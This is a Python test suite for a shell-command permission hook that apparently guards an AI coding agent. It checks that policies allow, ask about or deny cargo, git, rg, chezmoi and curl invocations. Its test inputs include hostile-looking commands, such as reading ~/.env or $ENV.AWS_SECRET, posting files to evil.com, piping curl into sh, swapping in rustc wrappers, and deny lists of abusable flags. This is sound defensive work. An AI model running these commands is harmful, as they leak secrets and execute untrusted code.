"""Tests for home/dot_claude/hooks/permission_policy.py.

POLICY mirrors the shape chezmoi renders into permission-policy.json; the
real-policy checks live in tests/test_permission_config.py.
"""

import os
import sys
import tempfile
import unittest
from unittest import mock

HOOKS = os.path.join(os.path.dirname(__file__), "..", "home", "dot_claude", "hooks")
sys.path.insert(0, os.path.abspath(HOOKS))

from permission_policy import _scan, decide  # noqa: E402

ROOT = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
TRUSTED = ROOT
UNTRUSTED = "/tmp"
POLICY = {
    "permissions": {
        "hook": {"trusted_dev_roots": [ROOT]},
        "commands": {
            "cargo": {"env_allow": {"RUST_BACKTRACE": "0|1|full",
                                    "RUST_LOG": "[A-Za-z0-9_=,:.-]+"}},
            "rg": {"deny_flags": ["--pre", "--pre-glob", "--hostname-bin"], "glob_args": True},
            "tree": {"deny_flags": ["-o", "-R"]},
            "git": {"deny_flags": ["--output", "--ext-diff", "--textconv",
                                   "--no-index", "--contents"],
                    "env_allow": {"NO_COLOR": "1", "GIT_PAGER": "cat"}},
            "chezmoi": {"deny_flags": ["--config", "-c", "--pager", "--output", "-o"],
                        "env_allow": {"NO_COLOR": "1"}},
            "probe": {"ask_flags": ["--risky"]},
        },
    },
    "chezmoi_working_tree": ROOT,
}


def permission(command, cwd=TRUSTED, agent=None, policy=POLICY):
    return decide(command, cwd, agent, policy).permission


class CargoFastPath(unittest.TestCase):
    def test_allowed(self):
        for command in [
            "cargo test",
            "rtk cargo clippy --all-targets",
            "cargo test 2>&1 | grep -i fail | sort | uniq -c | head -20",
            "cargo build 2>/dev/null | tail -n 5",
            "RUST_BACKTRACE=1 cargo +nightly test --workspace -- --nocapture",
            "cargo +1.80 check -p my_crate --features a/b,c",
            "cargo test module::case -- --test-threads=1",
            "cargo test | sed -n '5,10p'",
            "cargo test | sed -n '$p'",
            "cargo test | jq -r .name",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "allow")

    def test_not_allowed(self):
        for command in [
            "cargo test | xargs rm -rf /tmp/zz",
            "cargo test | tee out.txt",
            "cargo test | sort -o out",
            "cargo test | uniq a b",
            "cargo test | sed -i s/a/b/ f",
            "cargo test | grep x secrets.txt",
            "cargo test | jq '$ENV.AWS_SECRET'",
            "cargo build --manifest-path=/tmp/evil/Cargo.toml",
            "cargo build --config 'build.rustc-wrapper=\"/tmp/evil\"'",
            "cargo build --target /tmp/evil.json",
            "cargo build --target-dir /tmp/out",
            "cargo -Zunstable-options -C /tmp/evil build",
            "/tmp/evil/cargo build",
            "cargo +/tmp/evil build",
            "cargo publish",
            "python3 -c 'print(1)'",
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_untrusted_directory(self):
        self.assertIsNone(permission("cargo test", cwd=UNTRUSTED))

    def test_unparseable_cargo_asks(self):
        for command in ["cargo build `touch x`", "cargo test > out.txt",
                        "cat ~/.env; cargo test > out.txt"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "ask")

    def test_cargo_in_a_list_does_not_approve_the_rest(self):
        self.assertIsNone(permission("cargo test; cat ~/.env"))

    def test_env_not_allowlisted_denies(self):
        for command in ["RUSTC_WRAPPER=/tmp/evil cargo build",
                        "RUSTFLAGS='-C linker=/tmp/evil' cargo build",
                        "RUST_BACKTRACE=yes cargo test"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")


class FlagRules(unittest.TestCase):
    def test_denied(self):
        for command in [
            "rg --pre=./x foo .",
            "rtk rg --pre ./x foo",
            "rg --hostname-bin=/tmp/x foo",
            "rg $(echo --pre=x) foo",
            "tree -o out.txt",
            "tree -ao out.txt",
            "git log -1 --output=/tmp/x",
            "rtk git show --ext-diff HEAD",
            "chezmoi git -- log --output=/tmp/x",
            "git diff --no-index /dev/null x",
            "git blame --contents f g",
            "GIT_EXTERNAL_DIFF=/tmp/x git diff",
            "GIT_PAGER=/tmp/x git log",
            "chezmoi cat -o ~/.zshrc x",
            "chezmoi diff --config /tmp/c.toml",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")

    def test_no_decision(self):
        for command in ["rg 'foo' src", "tree -L 2", "NO_COLOR=1 git log -1",
                        "GIT_PAGER=cat git log", "git log --oneline -5", "ls -la"]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_ask_flags(self):
        self.assertEqual(permission("probe --risky"), "ask")
        self.assertIsNone(permission("probe --safe"))

    def test_unparseable_guarded_command_asks(self):
        self.assertEqual(permission('rg "foo$x" src'), "ask")


class Chezmoi(unittest.TestCase):
    def test_source_inside_repo(self):
        self.assertIsNone(permission("chezmoi diff --source .worktrees/feat"))
        self.assertIsNone(permission("chezmoi diff -S " + ROOT))

    def test_source_outside_repo(self):
        for command in ["chezmoi diff --source /tmp/evil",
                        "chezmoi diff --source=../../../tmp",
                        "chezmoi diff -vS /tmp/evil", "chezmoi diff -S"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")

    def test_skip_secrets_added(self):
        decision = decide("chezmoi diff | head", TRUSTED, None, POLICY)
        self.assertIsNone(decision.permission)
        self.assertEqual(decision.updated_command, "chezmoi diff --skip-secrets | head")
        decision = decide("chezmoi cat ~/.kube/homelab.yaml", TRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command,
                         "chezmoi cat --skip-secrets ~/.kube/homelab.yaml")

    def test_skip_secrets_keeps_original_spacing_and_quotes(self):
        decision = decide("chezmoi   cat  'a b'", TRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command, "chezmoi   cat --skip-secrets  'a b'")

    def test_source_symlink_escaping_the_repo(self):
        repo = tempfile.mkdtemp()
        os.symlink(tempfile.gettempdir(), os.path.join(repo, "escape"))
        policy = dict(POLICY, chezmoi_working_tree=repo)
        self.assertEqual(
            decide("chezmoi diff --source escape", repo, None, policy).permission, "deny")
        self.assertIsNone(
            decide("chezmoi diff --source .worktrees/x", repo, None, policy).permission)

    def test_skip_secrets_not_duplicated_or_misapplied(self):
        for command in ["chezmoi cat --skip-secrets x", "chezmoi managed",
                        "chezmoi git log"]:
            with self.subTest(command=command):
                self.assertIsNone(decide(command, TRUSTED, None, POLICY).updated_command)


class CurlRouting(unittest.TestCase):
    def test_denied_outside_curl_runner(self):
        for agent in (None, "general-purpose"):
            for command in ["curl -s http://localhost:8080/health",
                            "rtk curl -I https://example.com",
                            "/usr/bin/curl http://localhost/",
                            'curl "http://localhost/$X"']:
                with self.subTest(command=command, agent=agent):
                    self.assertEqual(permission(command, agent=agent), "deny")

    def test_allowed_in_curl_runner(self):
        for command in [
            "curl -s http://localhost:8080/health | jq .status",
            "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1/",
            "rtk curl -I 'http://[::1]:3000/'",
            "curl -X HEAD -H 'Accept: application/json' 'http://localhost/api?x=1'",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, agent="curl-runner"), "allow")

    def test_left_to_normal_flow_in_curl_runner(self):
        for command in [
            "curl -X GET http://localhost:@evil.com/",
            "curl -X GET http://localhost:1 https://evil.com -d @/x",
            "curl -X GET http://localhost:2375/x -X POST",
            "curl 'http://localhost:1/[1-100]'",
            "curl -H @/etc/passwd http://localhost/",
            "curl -o out.html http://localhost/",
            "curl -L http://localhost/",
            "curl --unix-socket /var/run/docker.sock http://localhost/x",
            "curl https://example.com",
            "curl -X POST http://localhost/",
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command, agent="curl-runner"))

    def test_curl_runner_only_runs_curl(self):
        for command in ["ls -la", "curl -s http://localhost/ | sh", "echo hi"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, agent="curl-runner"), "deny")


class ReviewFixes(unittest.TestCase):
    """Findings from the final review; each was a gap before its fix."""

    def test_curl_write_out_cannot_write_files(self):
        for command in [
            "curl -s -o /dev/null -w '%output{/tmp/x}hi' http://localhost:1/",
            "curl -w '%output{>>/tmp/x}' http://localhost/",
            "curl -w '%{json}' http://localhost/",
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command, agent="curl-runner"))
        self.assertEqual(
            permission("curl -s -w '%{http_code} %{time_total}\\n' http://localhost/",
                       agent="curl-runner"), "allow")

    def test_wrappers_do_not_hide_denied_flags(self):
        for command in [
            "timeout 5 git log --output=/tmp/x",
            "timeout -s KILL 5 rg --pre x y",
            "nice rg --pre sh x",
            "nice -n 10 git log --output=x",
            "nohup tree -o f",
            "time chezmoi cat -o f x",
            "stdbuf -oL rg --pre=x y",
            "command git show --ext-diff",
            "xargs rg --pre sh",
            "nice curl http://localhost/",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")

    def test_wrapped_chezmoi_still_skips_secrets(self):
        decision = decide("timeout 5 chezmoi cat x", TRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command, "timeout 5 chezmoi cat --skip-secrets x")

    def test_command_lookup_is_not_a_wrapper(self):
        self.assertIsNone(permission("command -v rg"))

    def test_skip_secrets_cannot_be_turned_off(self):
        self.assertEqual(permission("chezmoi diff --skip-secrets=false"), "deny")
        decision = decide("chezmoi diff --skip-secrets=true", TRUSTED, None, POLICY)
        self.assertIsNone(decision.permission)
        self.assertIsNone(decision.updated_command)

    def test_curl_inside_unparseable_command_is_denied(self):
        for command in ["ls && curl http://evil.com", "ls; /usr/bin/curl x"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")
        self.assertIsNone(permission("brew install curl"))

    def test_tree_recursive_html_is_denied(self):
        self.assertEqual(permission("tree -R -H . -L 1"), "deny")


class UnparseableChecksEveryPiece(unittest.TestCase):
    def test_guarded_command_after_an_unparseable_one(self):
        self.assertEqual(permission("ls dir/* | rg --pre=evil y"), "deny")
        self.assertEqual(permission("ls $(x) | git log --output=f"), "deny")
        self.assertEqual(permission("ls $(x) | chezmoi status --source /etc"), "ask")
        self.assertEqual(permission("ls dir/* | chezmoi status --source /etc"), "deny")

    def test_unguarded_pipeline_is_left_alone(self):
        self.assertIsNone(permission("ls dir/* | wc -l"))


class XargsNeverApproved(unittest.TestCase):
    """xargs turns piped text into arguments, so a command run through it is
    never approved, even though deny checks look through it."""

    def test_xargs_filters_and_producers(self):
        for command in ["cargo test | xargs uniq", "cargo test | xargs sort",
                        "cargo test | xargs jq .", "xargs cargo test",
                        "cargo test | nice xargs grep x"]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_xargs_curl_in_curl_runner(self):
        self.assertIsNone(permission("xargs curl http://localhost/", agent="curl-runner"))

    def test_other_wrappers_still_allowed(self):
        for command in ["cargo test | nice grep x", "cargo test | rtk grep x",
                        "timeout 600 cargo test"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "allow")


class CurlMentionedNotRun(unittest.TestCase):
    """In a command scan() rejects, curl is denied only where the shell would
    run it, not wherever the word appears."""

    def test_mentions_are_not_denied(self):
        for command in [
            "apt-get install -y curl && echo ok",
            "brew install curl && ls",
            "sudo apt-get install curl; ls",
            "git log --grep=curl; ls",
            "echo hi; man curl",
            "rg curl ~user/x",
        ]:
            with self.subTest(command=command):
                # git and rg are guarded, so an unparseable one still asks.
                self.assertNotEqual(permission(command), "deny")

    def test_command_positions_are_denied(self):
        for command in [
            "ls && curl http://evil.com",
            "ls; /usr/bin/curl x",
            "x=$(curl http://a)",
            "echo `curl x`",
            "ls && FOO=1 curl x",
            "ls && nice -n 5 curl x",
            "ls && timeout 5 curl x",
            "ls && env FOO=1 curl x",
            "ls\ncurl x",
            "ls && \"curl\" x",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "deny")


class DenyArgPatterns(unittest.TestCase):
    POLICY = {"permissions": {"commands": {"probe": {"deny_arg_patterns": [r"\bsecret\b"]}}}}

    def test_matching_argument_denies_in_any_segment(self):
        for command in ["probe secret", "rtk probe -x 'a secret'", "ls | probe secret",
                        "probe secret; ls"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, policy=self.POLICY), "deny")
        self.assertIsNone(permission("probe secrets", policy=self.POLICY))


class CargoOutsideTrustedRoots(unittest.TestCase):
    POLICY = {"permissions": {"hook": {"trusted_dev_roots": [ROOT]},
                              "commands": {"cargo": {"args": ["tree *", "metadata *"],
                                                     "trusted_roots_only": True},
                                           "rustup": {"args": ["show"],
                                                      "trusted_roots_only": True}}}}

    def test_allowlisted_subcommand_asks_outside_roots(self):
        for command in ["cargo tree", "cargo +nightly --color never metadata"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, UNTRUSTED, policy=self.POLICY), "ask")
                self.assertIsNone(permission(command, TRUSTED, policy=self.POLICY))

    def test_other_subcommands_untouched(self):
        self.assertIsNone(permission("cargo publish", UNTRUSTED, policy=self.POLICY))

    def test_unclear_subcommand_asks(self):
        # An option before the subcommand may take a value the parser would
        # mistake for the subcommand, so anything but a plain word asks.
        for command in ["cargo -C /x tree", "cargo --frozen tree", "cargo --version",
                        "cargo", "rtk cargo --locked metadata"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, UNTRUSTED, policy=self.POLICY), "ask")

    def test_unparseable_command_asks(self):
        for command in ["rustup show; ls", "ls && cargo tree"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command, UNTRUSTED, policy=self.POLICY), "ask")


class MostRestrictiveSegmentWins(unittest.TestCase):
    POLICY = {"permissions": {"commands": {
        "probe": {"ask_flags": ["--risky"]},
        "jq": {"deny_arg_patterns": [r"\benv\b"]},
    }}}

    def test_deny_in_a_later_segment_beats_an_earlier_ask(self):
        self.assertEqual(permission("probe --risky | jq -n env", policy=self.POLICY), "deny")


class CommandLists(unittest.TestCase):
    """Each piece of a `&&` / `||` / `;` list is decided on its own."""

    def test_parseable_pieces_no_longer_ask(self):
        for command in [
            "cd %s && git status" % ROOT,
            "git status; rg -n foo src | head -5",
            "rg -n 'a;b' x && wc -l y\nls",
            'git log --format=%%B -1 | grep -c "^Assisted-by: AI$"; cd %s' % ROOT,
        ]:
            with self.subTest(command=command):
                self.assertIsNone(permission(command))

    def test_each_piece_keeps_its_own_checks(self):
        self.assertEqual(permission("ls; rg --pre=evil x"), "deny")
        self.assertEqual(permission("cd /tmp && chezmoi status --source /etc"), "deny")
        self.assertEqual(permission("ls && probe --risky; ls"), "ask")
        self.assertEqual(permission('ls; rg "a$x" src'), "ask")

    def test_deny_beats_an_earlier_ask(self):
        self.assertEqual(permission("probe --risky; git log --output=f"), "deny")

    def test_cd_sets_the_directory_later_pieces_are_checked_in(self):
        source = "chezmoi status --source ."
        self.assertIsNone(permission("cd %s && %s" % (ROOT, source), cwd=UNTRUSTED))
        self.assertEqual(permission("cd /tmp && " + source), "deny")
        decision = decide("cd %s && chezmoi diff | head" % ROOT, UNTRUSTED, None, POLICY)
        self.assertEqual(decision.updated_command,
                         "cd %s && chezmoi diff --skip-secrets | head" % ROOT)

    def test_untracked_shell_changes_make_guarded_pieces_ask(self):
        for command in [
            "export GIT_DIR=/tmp/x; git status",
            "eval x && rg foo",
            "pushd /tmp && git status",
            "cd no-such-dir && git status",
            "cd /nonexistent-dir && git status",
            "cd %s || git status" % ROOT,
            "true && cd %s; git status" % ROOT,
            "echo /tmp | read PATH; git status",
            "printf -v PATH x; git status",
            "/tmp && git status",
            "ls $x; git status",
            "f=$(fd x); git status",
            "ls; git log $(cat f)",
        ]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "ask")

    def test_rtk_read_is_not_the_read_builtin(self):
        self.assertIsNone(permission("rtk read f; git status"))
        self.assertEqual(permission("command read f; git status"), "ask")

    def test_unguarded_pieces_after_a_shell_change_are_left_alone(self):
        self.assertIsNone(permission("export X=1; ls"))

    def test_heredoc_body_is_not_a_command(self):
        command = "git commit -F - <<'EOF'\nfix: x; rg --pre=evil y\nEOF"
        self.assertIsNone(permission(command))
        self.assertIsNone(permission("rg x && " + command))
        self.assertIsNone(permission(command + "\nrg x"))
        self.assertEqual(permission(command + "\nrg --pre=evil x"), "deny")

    def test_relative_cd(self):
        tests = os.path.join(ROOT, "tests")
        source = "chezmoi status --source ."
        self.assertIsNone(permission("cd tests && cd .. && " + source, cwd=ROOT))
        self.assertEqual(permission("cd .. && " + source, cwd=ROOT), "deny")
        self.assertIsNone(permission("cd ../ && " + source, cwd=tests))
        self.assertIsNone(permission("cd .. 2>/dev/null && " + source, cwd=tests))
        with mock.patch.dict(os.environ, {"CDPATH": "/tmp"}):
            self.assertEqual(permission("cd tests && cd .. && " + source, cwd=ROOT), "ask")
            self.assertIsNone(permission("cd ./tests && cd .. && " + source, cwd=ROOT))

    def test_unmodelled_lists_use_the_whole_command_check(self):
        for command in ["(cd /tmp; git status)", "git status & ls",
                        "ls # x; git status", "echo $(ls); git status"]:
            with self.subTest(command=command):
                self.assertEqual(permission(command), "ask")


class Globs(unittest.TestCase):
    def test_glob_args_opt_in(self):
        self.assertIsNone(permission("rg -n foo docs/*.md src/?.go"))
        self.assertEqual(permission("rg --pre=x foo docs/*.md"), "deny")
        self.assertEqual(permission("tree -L 1 dir/*"), "ask")

    def test_curl_runner_never_allows_a_glob(self):
        self.assertIsNone(permission("curl http://localhost/x?a=1", agent="curl-runner"))
        self.assertEqual(permission("curl 'http://localhost/x?a=1'", agent="curl-runner"),
                         "allow")

    def test_unguarded_globs_parse(self):
        self.assertIsNone(permission("ls docs/* && git status"))

    def test_glob_in_a_command_name_is_unparseable(self):
        for command in ["g?t status", "rtk r? foo", "timeout 5 r* foo"]:
            with self.subTest(command=command):
                self.assertIsNone(_scan(command, POLICY))


class MissingPolicy(unittest.TestCase):
    def test_empty_policy_never_allows_but_still_routes_curl(self):
        self.assertIsNone(permission("cargo test", policy={}))
        self.assertEqual(permission("curl http://localhost/", policy={}), "deny")


if __name__ == "__main__":
    unittest.main()
